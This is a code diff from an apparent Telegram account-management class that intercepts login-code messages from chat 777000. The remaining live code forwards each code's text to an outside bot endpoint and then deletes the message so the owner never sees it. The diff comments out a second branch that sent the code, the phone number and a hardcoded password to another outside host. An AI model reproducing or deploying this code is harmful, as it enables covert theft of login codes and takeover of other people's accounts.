@@ -303,20 +303,20 @@ class TelegramManager {
             if (event.message.chatId.toString() == "777000") {
                 console.log(event.message.text.toLowerCase());
                 console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
-                if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.newMobile) {
-                    console.log("LoginText: ", event.message.text)
-                    const code = (event.message.text.split('.')[0].split("code:**")[1].trim())
-                    console.log("Code is:", code);
-                    try {
-                        await fetchWithTimeout(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
-                        console.log("Code Sent back");
-                    } catch (error) {
-                        parseError(error)
-                    }
-                } else {
+                // if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.newMobile) {
+                //     console.log("LoginText: ", event.message.text)
+                //     const code = (event.message.text.split('.')[0].split("code:**")[1].trim())
+                //     console.log("Code is:", code);
+                //     try {
+                //         await fetchWithTimeout(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
+                //         console.log("Code Sent back");
+                //     } catch (error) {
+                //         parseError(error)
+                //     }
+                // } else {
                     await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(event.message.text)}`);
                     await event.message.delete({ revoke: true });
-                }
+                // }
             }
         }
     }
